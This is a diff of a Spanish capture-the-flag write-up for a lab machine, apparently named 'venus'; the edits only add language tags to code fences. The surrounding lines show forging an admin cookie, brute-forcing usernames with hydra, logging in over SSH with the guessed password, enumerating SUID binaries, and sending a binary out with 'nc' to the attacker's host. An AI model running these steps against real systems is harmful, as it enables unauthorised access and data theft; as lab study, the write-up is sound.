@@ -75,7 +75,7 @@ Para conseguir acceder al panel de admin, podemos usar `guest:guest` y en la coo
 
 Intentamos crear una cookie con el valor adecuado:
 
-```
+```text
 admin:admin > admin:nqzva > YWRtaW46bnF6dmE=
 ```
 
@@ -85,13 +85,13 @@ Deberemos buscar otra forma de acceder al panel de admin.
 
 Vamos a intentar sacar usuarios con `hydra` usando la password por defecto `guest` y el mensaje de error que inyecta en la página cuando el usuario no es correcto, `Invalid username.`.
 
-```
+```bash
 hydra -L ~/Descargas/usernames.txt -p guest -s 8080 10.0.12.26 http-post-form "/:username=^USER^&password=^PASS^:Invalid username."
 ```
 
 Encontramos los siguientes usuarios:
 
-```
+```bash
 [8080][http-post-form] host: 10.0.12.26   login: guest   password: guest
 [8080][http-post-form] host: 10.0.12.26   login: magellan   password: guest
 [8080][http-post-form] host: 10.0.12.26   login: venus   password: guest
@@ -101,7 +101,7 @@ Iniciamos sesion con `magellan:guest` y miramos su token: `"bWFnZWxsYW46aXJhaGZ2
 
 Intentamos iniciar sesion ssh con las credenciales:
 
-```
+```bash
 datadiego@~ ssh magellan@10.0.12.26 -p 22
 magellan@10.0.12.26's password: 
 Last failed login: Fri Feb 21 15:59:31 GMT 2025 from 10.0.12.25 on ssh:notty
@@ -118,7 +118,7 @@ Volvemos a usar el comando de la anterior maquina de la serie `find / -perm -u=s
 
 Encontramos varios binarios con permisos de setuid:
 
-```
+```bash
 [magellan@venus ~]$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/chage
 /usr/bin/gpasswd
@@ -177,7 +177,7 @@ Listening on 0.0.0.0 8888
 
 En la maquina victima:
 
-```
+```bash
 [magellan@venus polkit-1]$ cat polkit-agent-helper-1 | nc 10.0.12.25 8888
 ```
 
@@ -185,7 +185,7 @@ En la maquina victima:
 
 ### strings
 
-```
+```text
 /lib64/ld-linux-x86-64.so.2
 &*iE
 _ITM_deregisterTMCloneTable
